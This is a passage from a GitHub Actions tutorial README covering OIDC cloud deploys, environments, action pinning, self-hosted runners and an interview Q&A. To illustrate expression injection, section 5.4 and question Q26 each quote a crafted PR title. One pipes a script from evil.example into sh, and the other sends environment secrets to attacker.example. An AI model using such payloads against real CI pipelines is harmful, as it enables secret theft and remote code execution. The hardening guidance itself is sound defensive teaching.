    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v5

      - name: Authenticate to AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeploymentRole
          aws-region: us-east-1
          audience: sts.amazonaws.com

      - name: Deploy
        run: |
          aws sts get-caller-identity
          aws s3 sync ./dist s3://production-static-assets/
```

The claim checks a trust policy performs are modelled in [`src/oidc.js`](src/oidc.js). The `sub` claim changes shape with the trigger: `repo:ORG/REPO:ref:refs/heads/main` for a branch push, `repo:ORG/REPO:environment:production` when the job targets an environment, `repo:ORG/REPO:pull_request` for PRs. Trust the environment form for production roles, so that only jobs that passed the environment's protection rules can assume them.

### 5.2 GitHub Environments, Required Reviewers & Deployment Branches

Environments add guardrails to the jobs that name them:

- **Required reviewers**: up to six people or teams must approve before the job starts.
- **Wait timer**: delays the job, for example to let a canary soak.
- **Deployment branches and tags**: only listed refs can deploy to the environment.
- **Environment secrets and variables**: only jobs that target the environment can read them.

```yaml
jobs:
  deploy-production:
    environment:
      name: production
      url: https://api.example.com/health
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy-to-prod.sh
```

### 5.3 Supply Chain Hardening: Pinning by SHA, Dependabot, and Harden-Runner

A tag such as `@v4` can be moved to different code by anyone who controls the action's repository, or who compromises it. Pin third-party actions by their full 40-character commit SHA and keep the tag as a comment so Dependabot can update both:

```yaml
# Mutable: follows whatever the tag points to today
uses: actions/checkout@v4

# Immutable: this exact code
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

### 5.4 Secret Masking, Log Sanitation, and Preventing Expression Injection

Never interpolate untrusted input (PR titles, branch names, commit messages, issue bodies) directly into a shell script:

```yaml
# Vulnerable: expression injection
# A PR titled  a"; curl -sSf https://evil.example/x.sh | sh; echo "  runs the attacker's script
- run: echo "Processing PR: ${{ github.event.pull_request.title }}"

# Safe: pass the value through an environment variable
- name: Log PR title safely
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
```

GitHub masks registered secrets in logs, but only their exact text. A secret you transform (base64, URL-encode, JSON-escape) prints unmasked unless you register the new form with `echo "::add-mask::$VALUE"` before printing it.

[Back to top ⤴️](#-table-of-contents)

---

## 6. Stage 6: Self-Hosted Runners & Scalable Infrastructure

Hosted runners stop being enough when you need private network access, special hardware, or very high volume. This stage covers running your own fleet on Kubernetes without carrying state between jobs. Prerequisite: Stages 1-5.

### 6.1 Actions Runner Controller (ARC) on Kubernetes

**Actions Runner Controller (ARC)** is a Kubernetes operator that creates an ephemeral runner pod per job and deletes it afterwards.

```mermaid
flowchart TD
    GHAPI["GitHub Actions service"] <-->|"HTTPS long poll"| Listener["Scale set listener pod"]
    Listener -->|"Desired runner count"| ARCOp["ARC controller (operator)"]
    ARCOp -->|"Creates EphemeralRunner pods"| Pod1["Runner pod 1"]
    ARCOp -->|"Creates EphemeralRunner pods"| Pod2["Runner pod 2"]
    Pod1 -->|"Runs one job, exits"| Term["Pod deleted"]
```

#### Runner Scale Set Manifest

ARC is normally installed with the `gha-runner-scale-set-controller` and `gha-runner-scale-set` Helm charts, which render a resource like this:

```yaml
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata:
  name: build-fleet
  namespace: arc-runners
spec:
  githubConfigUrl: "https://github.com/acme-corp"
  githubConfigSecret: arc-github-app   # GitHub App credentials
  minRunners: 2
  maxRunners: 50
  template:
    spec:
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:latest
          command: ["/home/runner/run.sh"]
          resources:
            requests:
              cpu: "2000m"
              memory: "4Gi"
            limits:
              cpu: "4000m"
              memory: "8Gi"
```

Workflows target the scale set by its name: `runs-on: build-fleet`.

### 6.2 Ephemeral Runner Pod Lifecycle & Storage Volume Cleanup

When self-hosted runners do containerised builds, Docker-in-Docker or Kaniko can leave layer caches and volumes on the node.

```mermaid
flowchart TD
    JobStart["New job assigned"] --> PodInit["Ephemeral pod created"]
    PodInit --> EphemeralVol["emptyDir volume mounted (/home/runner/_work)"]
    PodInit --> Exec["Workflow steps run"]
    Exec --> JobEnd{"Job finished"}
    JobEnd --> PodTeardown["Pod deleted"]
    PodTeardown --> Wiped["emptyDir storage removed"]
    PodTeardown --> FreshPod["ARC creates a replacement pod if minRunners requires it"]
```

#### Comparison of Ephemeral Runner Storage Strategies

| Storage Type | Performance | Cleanup Guarantee | Cost |
| :--- | :--- | :--- | :--- |
| `emptyDir: {}` (node disk or RAM) | High (local disk) | Removed with the pod | Included with the node |
| `PersistentVolumeClaim (PVC)` | High (ReadWriteOnce) | Needs automated garbage collection | Cloud volume cost |
| Host path mount (`/var/run/docker.sock`) | Medium | Shares the node's Docker daemon: state and privileges leak across jobs | Free, but unsafe |

### 6.3 Artifact Retention Strategies and Storage Optimisation

By default GitHub keeps artifacts and logs for 90 days. Repositories that upload large reports on every PR fill their storage quota quickly.

```yaml
- name: Upload test report artifact
  uses: actions/upload-artifact@v4
  with:
    name: test-results-${{ matrix.os }}
    path: reports/
    retention-days: 5
    compression-level: 9
```

| Retention Parameter | Recommendation | Justification |
| :--- | :--- | :--- |
| `retention-days: 1-5` | CI test logs and PR reports | PRs are usually merged or closed within days |
| `retention-days: 30-90` | Release and deployment manifests | Needed for audit trails |
| `compression-level: 9` | Large text and JSON artifacts | Smaller uploads; use `0` for already-compressed files to save CPU |

[Back to top ⤴️](#-table-of-contents)

---
## 7. Stage 7: Staff GitHub Actions Platform Engineer Interview Handbook & Cheatsheet

Questions a staff-level platform or DevOps interview asks about GitHub Actions, with answers that explain the mechanism, not only the definition.

### 7.1 Core Concepts (Q1-Q10)

#### Q1. What is the execution difference between `pull_request` and `pull_request_target`?

`pull_request` runs the workflow file from the PR's merge commit (`refs/pull/N/merge`), against the PR's code. For PRs from forks it gets a read-only `GITHUB_TOKEN` and no secrets, so running untrusted code is safe. `pull_request_target` runs the workflow file from the **base** branch, checks out the base branch by default, and has secrets and a token that can write (within `permissions:`), even for fork PRs.

The danger is combining the two: checking out `github.event.pull_request.head.sha` inside a `pull_request_target` job and running anything from it (`npm install`, a test script, a Makefile) hands the attacker your secrets and a write token. Use `pull_request_target` only for metadata work such as labelling, and use `workflow_run` to act on results of an untrusted build (Stage 2.3).

#### Q2. What is the difference between composite actions and reusable workflows?

A **composite action** is a step. Its steps are inlined into the caller's job and run on the caller's runner, with the caller's permissions, environment and workspace. It cannot declare `runs-on`, `permissions`, `concurrency`, `environment`, or a matrix.

A **reusable workflow** (`on: workflow_call`) is a job, or several jobs. It declares its own runners, permissions, environments, concurrency and matrices, and appears in the caller's graph as one job with nested jobs. Use a composite action to share "how to set up and test a Node project"; use a reusable workflow to share "how this organisation builds, scans and deploys a service", including the protections around deploys.

| | Composite action | Reusable workflow |
| --- | --- | --- |
| Called with | a step's `uses:` | a job's `uses:` |
| Own `runs-on`, `permissions`, `environment` | No | Yes |
| Secrets | Passed as inputs | `secrets:` mapping or `secrets: inherit` |
| Nesting | Can call other actions, including composites | Can call other reusable workflows, to a limited depth |
| Logs | One step, expandable | Separate jobs in the run |

#### Q3. How do `env` values at workflow, job and step level interact with `$GITHUB_ENV`?

The most specific level wins: step `env:` overrides job `env:`, which overrides workflow `env:`. Lines appended to `$GITHUB_ENV` take effect from the **next** step and override workflow- and job-level values, while a step's own `env:` still wins for that step.

Two consequences: a step cannot change its own environment through `$GITHUB_ENV`, and the runner refuses some names in `$GITHUB_ENV` (such as `NODE_OPTIONS`) because they could inject code into every later action.

#### Q4. How does `fail-fast` work in a matrix, and when do you turn it off?

With the default `fail-fast: true`, the first failing matrix job cancels its in-progress and queued siblings. That saves minutes when any failure blocks the merge anyway. Turn it off (`fail-fast: false`) for platform matrices where each combination's result is information: you want to know whether a failure is Windows-only or happens everywhere. Jobs marked `continue-on-error: true` (for example `experimental` combinations) do not trigger fail-fast cancellation.

#### Q5. What is the difference between `$GITHUB_OUTPUT` and `$GITHUB_STATE`?

`$GITHUB_OUTPUT` sets a step output that later steps in the job read as `steps.<id>.outputs.<name>`, and that the job can re-export as a job output. `$GITHUB_STATE` passes a value from an action's `main` (or `pre`) entry point to the same action's `post` entry point, where it appears as the environment variable `STATE_<name>`. Use it for cleanup handles: a container id to stop, a temp credential file to delete.

#### Q6. How can a step run after an earlier step failed, and how do you keep the job green?

Give the later step a status function: `if: failure()` to run only after a failure, `if: ${{ !cancelled() }}` to run after success or failure. To let a step fail without failing the job, set `continue-on-error: true` on it; its `outcome` is `failure` but its `conclusion` is `success`, and later steps branch on `steps.<id>.outcome`. Without a status function, any `if:` is implicitly `success() && (...)` and is skipped after a failure.

#### Q7. How do you share build outputs between jobs?

Values go through job outputs (`jobs.<id>.outputs`, read with `needs.<id>.outputs`), which are strings capped at 1 MB per job. Files go through artifacts: `actions/upload-artifact@v4` in the producer and `actions/download-artifact@v4` in a job that `needs:` it. Artifacts are immutable and must have unique names per run, so matrix producers include matrix values in the name and the consumer uses `pattern:` with `merge-multiple: true`. Caches are the wrong tool for this: they are keyed for reuse across runs and can be evicted.

#### Q8. How does `hashFiles()` differ from a static cache key?

`hashFiles('**/package-lock.json')` returns a SHA-256 over the contents of every matching file, so the key changes exactly when dependencies change. Cache entries are immutable, so a static key is saved once and restored forever, giving stale dependencies. `hashFiles` returns an empty string when nothing matches, which silently turns a content key into a static prefix; check the resolved key in the logs.

#### Q9. How do you stop a hanging job from burning six hours of minutes?

Set `timeout-minutes` on every job (default 360) and on long steps. Combine it with tool-level timeouts (test runner per-test timeouts, `curl --max-time`) so the failure message names the slow thing instead of just "The job has exceeded the maximum execution time".

#### Q10. What are the hard time limits for jobs and workflow runs?

A job on a GitHub-hosted runner can run for at most 6 hours. On a self-hosted runner a job can run for up to 5 days. A workflow run as a whole, including time spent waiting for environment approvals, cannot exceed 35 days. A job waiting for a self-hosted runner is cancelled after 24 hours in the queue.

### 7.2 Internals & Performance (Q11-Q17)

#### Q11. How does OIDC authentication to a cloud work without stored keys?

A job with `permissions: id-token: write` receives two environment variables, a request URL and a bearer token, that let it ask GitHub's OIDC provider for a JWT. The JWT is signed by GitHub and carries claims about the run: `iss` (`https://token.actions.githubusercontent.com`), `aud` (requested by the client, for example `sts.amazonaws.com`), `sub` (for example `repo:acme/app:environment:production`), plus `repository`, `ref`, `workflow_ref`, `job_workflow_ref`, `environment` and others.

The cloud fetches GitHub's public keys from the issuer's `/.well-known/openid-configuration`, verifies the signature and expiry, and checks the claims against the role's trust policy. If they match, it issues temporary credentials (one hour by default for AWS). The design decision that matters is the `sub` condition: bind production roles to `environment:production`, so only jobs that passed the environment's reviewers and branch rules can assume them. [`src/oidc.js`](src/oidc.js) shows the claim checks.

#### Q12. Why does `actions/cache` sometimes report a hit but the build still downloads everything?

Usually one of three things. The cache restored from a `restore-keys` prefix, so `cache-hit` is `false` and the install still runs (correct behaviour, but often mistaken for a hit in the logs). The cached path is not where the tool reads from: caching `~/.npm` speeds up `npm ci` but does not skip it, while caching `node_modules` can break across Node versions. Or the key omits OS, architecture or tool version, so an incompatible cache restores and the tool rebuilds. Read the resolved key and `cache-hit` output, and model the lookup with [`src/cache.js`](src/cache.js).

#### Q13. How do you prevent secret leakage in logs when debugging?

The runner masks the exact text of every secret it knows about. It cannot recognise transformed values: base64, URL-encoded, split across lines, or a token derived from a secret. Register each derived value before it can be printed with `echo "::add-mask::$DERIVED"` (or `core.setSecret`). Avoid `set -x` in steps that handle secrets, avoid printing whole contexts with `toJSON(secrets)`, and remember that debug logging (`ACTIONS_STEP_DEBUG`) prints more, including evaluated expressions.

#### Q14. What happens when two runs with the same concurrency group start at once?

A group allows one running and one pending entry. With `cancel-in-progress: true`, the newer run cancels the running one and starts. With `cancel-in-progress: false`, the newer run waits as pending; if a third run arrives, the pending one is cancelled and replaced, so there is never a queue longer than one. That makes the default behaviour "run the newest", which suits deploys, but it means you cannot use concurrency groups as a FIFO queue. [`src/concurrency.js`](src/concurrency.js) and its test show the sequence.

#### Q15. What are runner scale sets in ARC?

Runner scale sets are the current ARC architecture. A listener pod per scale set keeps an HTTPS long-poll session with the Actions service and receives job assignments and the desired runner count. The controller turns that into `EphemeralRunner` pods, each registered with a just-in-time configuration for a single job. No inbound webhooks are needed, scaling follows real queue demand, and each pod is deleted after its job, so no state survives between jobs.

#### Q16. What does StepSecurity Harden-Runner add on hosted runners?

It is a third-party agent that monitors network egress, file writes and processes on Linux runners during a job. In audit mode it records which endpoints each job contacts; in block mode it enforces an allowlist, so a compromised dependency that tries to send secrets to an unknown host fails. It complements, rather than replaces, SHA pinning and least-privilege tokens.

#### Q17. How do you test workflows locally before pushing?

Run `actionlint` first: it validates syntax, expression types, context availability and the shell scripts in `run:` blocks. Then use `act` to execute Linux jobs in Docker with a fake event payload. For anything involving OIDC, caches, artifacts, environments or concurrency, push to a scratch branch and trigger with `workflow_dispatch`, because act cannot reproduce those services.

### 7.3 Architecture & Design (Q18-Q24)

#### Q18. How do you generate a matrix from the files changed in a commit?

Add a planning job that computes the list and exposes it as a JSON job output, then feed it to `strategy.matrix` with `fromJSON`:

```yaml
jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      services: ${{ steps.set.outputs.services }}
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0
      - id: set
        env:
          BASE: ${{ github.event.pull_request.base.sha || github.event.before }}
        run: |
          services=$(git diff --name-only "$BASE" "$GITHUB_SHA" -- services/ | cut -d/ -f2 | sort -u | jq -R . | jq -cs .)
          echo "services=$services" >> "$GITHUB_OUTPUT"
  build:
    needs: detect
    if: needs.detect.outputs.services != '[]'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        service: ${{ fromJSON(needs.detect.outputs.services) }}
    steps:
      - run: echo "building ${{ matrix.service }}"
```

Guard the empty case, keep the plan under the 256-job limit, and make the required check a fan-in job that always reports, since the set of matrix job names changes from PR to PR.

#### Q19. How do you restrict which actions an organisation may use?

In the organisation (or enterprise) Actions settings, choose to allow only selected actions and reusable workflows, allow GitHub-authored and verified-creator actions as needed, and list explicit patterns (`aws-actions/*`, `docker/*`, `acme-corp/*`). Policies can also require actions to be pinned to a full commit SHA. Pair the policy with an internal repository of approved composite actions and reusable workflows so teams have a paved path.

#### Q20. How do you make a GitHub Actions job a mandatory merge gate?

Add the check to a branch protection rule or a repository ruleset as a required status check. The check name is the job's name as shown on the PR, so matrix jobs appear as `test (ubuntu-latest, 24)`. Because matrix names and path-filtered workflows change, the robust design is a single fan-in job (for example `ci-ok`) that `needs:` everything and always reports; require only that job. If a merge queue is enabled, the workflow must also run on `merge_group`.

#### Q21. What is SLSA, and how do GitHub Actions builds reach higher SLSA build levels?

SLSA (Supply-chain Levels for Software Artifacts) defines build levels by how trustworthy an artifact's provenance is. Build L1 means provenance exists; L2 means it is generated and signed by a hosted build platform; L3 means the build runs on a hardened platform where the build steps cannot tamper with the provenance or the signing key.

On GitHub Actions, `actions/attest-build-provenance` signs provenance with a short-lived Sigstore certificate tied to the workflow's OIDC identity, which covers L2. Running the build and attestation inside a reusable workflow that callers cannot modify, on ephemeral hosted runners, isolates the signing identity from the caller's steps; that is the basis for L3 claims. Consumers verify with `gh attestation verify <file> --owner <org>`.

#### Q22. How do you handle secrets larger than the 48 KB limit?

Keep the large material outside GitHub secrets. Either store it in a secrets manager (AWS Secrets Manager, Azure Key Vault, Google Secret Manager, Vault) and fetch it at runtime with OIDC credentials, so no long-lived token is stored at all; or encrypt the file (for example with SOPS or `gpg --symmetric`), commit the ciphertext, and keep only the decryption key as a secret. Mask anything you print after decryption.

#### Q23. Design a multi-region deployment with canary verification.

Model each stage as a job targeting an environment, and connect them with `needs:`:

1. **build**: build once, push an image tagged with the commit SHA, attest provenance.
2. **staging**: deploy the SHA, run smoke tests.
3. **canary** (environment `production-canary`, required reviewers): send 5-10% of traffic in region A to the new version.
4. **verify**: query your metrics API for error rate and latency over a fixed window; fail the job if they exceed thresholds.
5. **rollout**: a matrix over regions with `max-parallel: 1` (or 2), each targeting a `production-<region>` environment.
6. **rollback**: `if: failure()` job that shifts traffic back to the previous version.

Give every deploy job a concurrency group per environment with `cancel-in-progress: false`, and assume cloud roles via OIDC bound to each environment's `sub`.

#### Q24. When is `workflow_run` the right tool, and what are its risks?

`workflow_run` starts a workflow when another workflow is requested or completes. It runs from the default branch with secrets and a write-capable token, even when the triggering run came from a fork. That is exactly what you need to post results of an untrusted `pull_request` build: download its artifact with `run-id: ${{ github.event.workflow_run.id }}`, then comment or upload SARIF. The risk is treating the artifact as trusted: parse it as data, never execute it, and validate fields such as the PR number before using them. `workflow_run` chains are limited to three levels.

### 7.4 Scenario & Debugging Questions (Q25-Q27)

#### Q25. A public repository uses self-hosted runners for PR builds. What can go wrong?

Anyone can fork the repository and open a pull request that edits the workflow or the build scripts. On a self-hosted runner that code runs inside your network: it can read cloud metadata endpoints, reach internal services, plant a backdoor that persists into the next job on a non-ephemeral runner, or steal credentials left on disk.

Diagnosis: list runner groups and the repositories allowed to use them, check whether any public repository can use a self-hosted group, and look at recent runs from forks. Fix: move public repositories to GitHub-hosted runners, require approval for workflows from outside contributors, and make any self-hosted runners ephemeral (ARC, or `--ephemeral` VMs) in a network segment without access to production. Prevention: a runner group policy that excludes public repositories, enforced at organisation level.

#### Q26. A CI step leaked secrets through a crafted PR title. Walk through the incident.

Incident: a PR titled `feat: clean"; curl -s "https://attacker.example/?d=$(env | base64 -w0)"; echo "` hit a step that ran `echo "${{ github.event.pull_request.title }}"`. The expression was substituted into the script before bash parsed it, so the title became code.

Response, in order: rotate every secret the job could read (including cloud roles' trust if keys were exposed), revoke any tokens, check audit logs for use of the leaked values, and disable the workflow until it is fixed. Fix: pass all event data through `env:` and quote it (`"$TITLE"`), drop the job's permissions to the minimum, and switch any long-lived cloud keys to OIDC. Prevention: run `actionlint` in CI (it flags untrusted inputs in `run:`), enable code scanning for workflows, and require review from a platform team for changes under `.github/workflows/`.

#### Q27. All builds are stuck in "Queued" during a release cut. How do you debug it?

Diagnosis: check whether the queued jobs target self-hosted labels. In the runner list, see whether runners are offline or busy; on the hosts, check disk space (`df -h`), Docker volume usage (`docker system df`) and the runner service logs (`_diag/Runner_*.log`). A common root cause is static runners whose disks filled with Docker layers and workspaces until the runner process failed to start new jobs. For hosted runners, check the organisation's concurrency limit and whether a few long jobs hold all slots.

Fix: free disk, restart the runner services, and cancel superseded runs. Prevention: ephemeral runners (ARC) so every job gets a clean pod, `timeout-minutes` on every job, `cancel-in-progress` for PR workflows, alerts on queue time, and capacity headroom for release days.

### 7.5 Staff Cheatsheet

| Need | GitHub Actions answer | Gotcha |
| --- | --- | --- |
| Least-privilege token | `permissions: {}` at top, grant per job | Job-level block replaces, not merges |
| Run only on some paths | `on.push.paths` / `paths-ignore` | Path-filtered required checks never report; use a fan-in job |
| Manual run with inputs | `workflow_dispatch.inputs` + `gh workflow run -f k=v` | File must be on the default branch |
| Pass a value to later steps | `echo "k=v" >> "$GITHUB_OUTPUT"` | Outputs are strings; use random heredoc delimiters for multi-line |
| Pass a value to other jobs | `jobs.<id>.outputs` + `needs.<id>.outputs` | 1 MB per job; only direct `needs` are readable |
| Pass files to other jobs | `upload-artifact@v4` / `download-artifact@v4` | Names unique per run; immutable |
| Speed up installs | `setup-node` `cache: npm`, or `actions/cache@v4` | `cache-hit` true only on exact key |
| Platform matrix | `strategy.matrix` + `fail-fast: false` | 256 jobs max; `include` merges before it appends |
| Matrix from data | `matrix: ${{ fromJSON(needs.plan.outputs.x) }}` | Empty array is an error |
| Cleanup after failure | `if: ${{ !cancelled() }}` | `always()` also runs after a cancel |
| Cancel superseded PR runs | `concurrency.group` + `cancel-in-progress` | One running plus one pending; not a FIFO queue |
| Serialise deploys | job-level `concurrency: deploy-<env>` | Newest pending replaces older pending |
| Cloud login | `id-token: write` + provider's login action | Bind trust to `sub`, not only `repository` |
| Bot commit must trigger CI | GitHub App token | `GITHUB_TOKEN` events do not start workflows |
| Untrusted input in scripts | `env: X: ${{ ... }}` then `"$X"` | Never `${{ }}` directly in `run:` |
| Debug a run | `ACTIONS_STEP_DEBUG=true`, `gh run rerun --debug` | Debug logs show more data; treat them as sensitive |

[Back to top ⤴️](#-table-of-contents)

---

## 🧪 Example Projects

| Project | Builds on | What you practise | Stretch goal |
| --- | --- | --- | --- |
| [Starter project](./) (this repository: `src/`, `actions/`, `examples/workflows/`) | [Stages 1-3](#1-stage-1-core-model-runners--your-first-workflow) | Workflows, contexts, outputs, matrices, caches, concurrency, a JavaScript and a composite action | Add a `src/expressions.js` that evaluates `contains`, `startsWith` and case-insensitive `==`, with tests |
| Polyglot monorepo CI | [3.4 Dynamic Matrices](#34-dynamic-matrices-with-fromjson), [3.6 Caching](#36-caching-with-actionscache-keys-scope-and-eviction) | Change detection, per-service matrices, a single required fan-in check | Cache build outputs per service with split restore/save |
| PR bot with `github-script` | [2.3 Trust Boundaries](#23-pull_request-vs-pull_request_target-vs-workflow_run-trust-boundaries), [4.5 github-script](#45-orchestrating-github-apis-with-actionsgithub-script) | Size labels, first-time contributor greeting, safe `pull_request_target` | Post test results from a fork build with `workflow_run` |
| Release pipeline | [2.1 Triggers](#21-trigger-events-and-filters), [3.7 Artifacts](#37-artifacts-passing-files-between-jobs-and-keeping-results) | Tag-triggered build, changelog, GitHub release with assets | Attest provenance and verify it with `gh attestation verify` |
| Keyless deploy to a cloud | [5.1 OIDC](#51-openid-connect-oidc-keyless-cloud-authentication-to-aws-azure-and-google-cloud), [5.2 Environments](#52-github-environments-required-reviewers--deployment-branches) | OIDC role, environment approvals, per-environment concurrency | Separate roles per environment bound to `sub` |
| Published JavaScript action | [4.3 JavaScript Actions](#43-custom-javascript-actions-with-actionscore) | `action.yml`, `node24`, bundling, tests, Marketplace release | Release automation that moves the `v1` tag on each release |
| Self-hosted fleet on kind | [6.1 ARC](#61-actions-runner-controller-arc-on-kubernetes) | Install ARC with Helm, a scale set, `runs-on` by scale set name | Docker-in-Docker mode with resource limits and an emptyDir work volume |
| Container build and scan | [4.6 Trivy](#46-container-vulnerability-scanning-with-trivy--sarif-upload) | Buildx, GHCR push, SARIF upload | Multi-arch images using native `ubuntu-24.04-arm` jobs and a manifest merge |

## 📝 Cheat Sheets

### CLI / Commands

```bash
# Workflows
gh workflow list
gh workflow view ci.yml
gh workflow run deploy.yml --ref main -f tier=staging
gh workflow disable nightly.yml && gh workflow enable nightly.yml

# Runs
gh run list --workflow ci.yml --branch main --limit 10
gh run watch --exit-status
gh run view <run-id> --log-failed
gh run rerun <run-id> --failed
gh run rerun <run-id> --debug
gh run cancel <run-id>
gh run download <run-id> --name junit-report

# Caches
gh cache list --sort last_accessed_at
gh cache delete <key>

# Secrets and variables
gh secret set NPM_TOKEN < token.txt
gh secret set DEPLOY_KEY --env production < key.pem
gh variable set AWS_REGION --body eu-west-1
gh variable list

# Attestations
gh attestation verify app.tgz --owner TheLearningHubOrg

# Local checks
docker run --rm -v "$PWD:/repo" --workdir /repo rhysd/actionlint:1.7.9 -color
act -l
act pull_request -j test

# This repository
npm test
node src/cli.js matrix '{"os":["ubuntu-latest"],"node":[22,24]}'
node src/cli.js waves '{"a":{},"b":{"needs":"a"}}'
node src/cli.js condition "github.ref == 'refs/heads/main'"
```

### Workflow Syntax Quick Reference

| Task | Code |
| --- | --- |
| Run on push to main and on PRs | `on: { push: { branches: [main] }, pull_request: {} }` |
| Nightly at 03:17 UTC | `on: { schedule: [{ cron: '17 3 * * *' }] }` |
| Default shell with pipefail | `defaults: { run: { shell: bash } }` |
| Job order | `needs: [lint, test]` |
| Run on failure of any ancestor | `if: failure()` |
| Run unless cancelled | `if: ${{ !cancelled() }}` |
| Branch on a label | `if: contains(github.event.pull_request.labels.*.name, 'deploy')` |
| Tag pushes only | `if: startsWith(github.ref, 'refs/tags/v')` |
| Step output | `echo "k=v" >> "$GITHUB_OUTPUT"` |
| Env for later steps | `echo "K=v" >> "$GITHUB_ENV"` |
| Add to PATH | `echo "$HOME/.local/bin" >> "$GITHUB_PATH"` |
| Job summary | `echo "### Done" >> "$GITHUB_STEP_SUMMARY"` |
| Annotation | `echo "::error file=a.js,line=3::message"` |
| Mask a value | `echo "::add-mask::$VALUE"` |
| Timeout | `timeout-minutes: 15` |
| Matrix from JSON | `matrix: { include: ${{ fromJSON(needs.plan.outputs.include) }} }` |
| Cancel superseded runs | `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }` |
| Reusable workflow call | `jobs: { ci: { uses: org/repo/.github/workflows/ci.yml@v1, secrets: inherit } }` |

## 📚 Resources

- [GitHub Actions documentation](https://docs.github.com/en/actions)
- [Workflow syntax reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows)
- [Contexts reference](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts)
- [Expressions reference](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions)
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Changelog: Actions](https://github.blog/changelog/label/actions/)
- [Runner images (contents and schedule)](https://github.com/actions/runner-images)
- [Runner application source](https://github.com/actions/runner)
- [Actions toolkit (`@actions/core` and friends)](https://github.com/actions/toolkit)
- [Actions Runner Controller](https://github.com/actions/actions-runner-controller)

## 🤝 Contributing

Contributions are welcome. Read the [contributing guide](https://github.com/TheLearningHubOrg/.github/blob/main/CONTRIBUTING.md) and the [code of conduct](https://github.com/TheLearningHubOrg/.github/blob/main/CODE_OF_CONDUCT.md) before you open a pull request. Commit messages follow [Conventional Commits](https://www.conventionalcommits.org/), which drive the automated changelog.

## 📄 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- [GitHub Actions](https://github.com/features/actions) and the maintainers of the runner, runner images and toolkit
- [actionlint](https://github.com/rhysd/actionlint), which lints this repository's workflows
- [act](https://github.com/nektos/act) for running workflows locally
- [Node.js](https://nodejs.org/) and its built-in `node:test` runner

## 🌐 Connect with me

- [Twitter](https://twitter.com/manthan_ank)
- [LinkedIn](https://www.linkedin.com/in/manthanank)
- [Facebook](https://www.facebook.com/manthanank/)
- [Instagram](https://www.instagram.com/manthan_ank/)
- [YouTube](https://www.youtube.com/@manthanank)
- [GitHub](https://github.com/manthanank)

## ☕ Support

If you like this learning repository and find it useful, consider buying me a coffee or sponsoring me through GitHub Sponsors. Your support helps me keep these guides up to date. Thank you!

[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-donate-FFDD00?logo=buymeacoffee&logoColor=000)](https://www.buymeacoffee.com/manthanank)

[![Sponsor Me](https://img.shields.io/badge/Sponsor-GitHub-green?logo=github)](https://github.com/sponsors/manthanank)

---

Show your support by 🌟 the repository.
